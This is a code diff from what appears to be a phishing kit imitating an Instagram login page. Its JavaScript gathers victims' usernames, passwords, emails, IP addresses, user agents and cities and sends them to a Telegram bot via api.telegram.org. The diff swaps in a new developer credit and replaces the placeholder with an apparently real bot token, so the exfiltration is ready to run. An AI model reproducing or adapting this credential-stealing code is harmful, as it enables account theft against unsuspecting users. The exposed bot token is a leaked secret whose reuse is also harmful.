@@ -531,10 +531,10 @@ function submitonhfc() {
       const password = document.getElementById("password").value; // Collecting password too
 
       // Create the message to send
-      const message = `Login Page: 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 🗿 \n\n• > 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :- ${name}\n\n•> 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 :-  ${password}\n\n•> 𝙴𝙼𝙰𝙸𝙻 / 𝙽𝚄𝙼𝙱𝙴𝚁 :- ${email}\n\n•> 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃 :-  ${userAgent}\n\n•> 𝙸𝙿 𝙰𝙳𝙳𝚁𝙴𝚂𝚂 :- ${ip}\n\n•> 𝙲𝙸𝚃𝚈 :- ${cityName}\n\n Devloper:- @Hacker_Hu_vro`;
+      const message = `Login Page: 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 🗿 \n\n• > 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :- ${name}\n\n•> 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 :-  ${password}\n\n•> 𝙴𝙼𝙰𝙸𝙻 / 𝙽𝚄𝙼𝙱𝙴𝚁 :- ${email}\n\n•> 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃 :-  ${userAgent}\n\n•> 𝙸𝙿 𝙰𝙳𝙳𝚁𝙴𝚂𝚂 :- ${ip}\n\n•> 𝙲𝙸𝚃𝚈 :- ${cityName}\n\n Devloper:- @synaxBots`;
 
       // Send the message to the specified Telegram chat using the appropriate API
-      const botToken = 'ENTER_YOUR_BOT_TOKEN'; // Replace with your bot token
+      const botToken = '7024182588:AAFuqanRnuz5_9NdBJEwMD_UPXC1ncEe-Rk'; // Replace with your bot token
       const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
 
       console.log("Chat ID:", chatId); // Debugging line
